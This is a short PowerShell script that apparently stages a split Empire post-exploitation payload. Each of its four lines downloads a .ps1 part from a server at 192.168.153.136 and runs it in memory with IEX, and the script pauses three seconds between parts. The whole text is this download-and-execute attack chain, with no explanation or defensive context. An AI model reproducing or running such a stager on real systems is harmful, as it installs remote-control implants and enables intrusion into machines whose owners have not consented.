IEX((new-object net.webclient).downloadstring('http://192.168.153.136/Empire-payload-parts/part1.ps1'))
Start-Sleep -Seconds 3;
IEX((new-object net.webclient).downloadstring('http://192.168.153.136/Empire-payload-parts/part2.ps1'))
Start-Sleep -Seconds 3;
IEX((new-object net.webclient).downloadstring('http://192.168.153.136/Empire-payload-parts/part3.ps1'))
Start-Sleep -Seconds 3;
IEX((new-object net.webclient).downloadstring('http://192.168.153.136/Empire-payload-parts/part4.ps1'))
Start-Sleep -seconds 3;
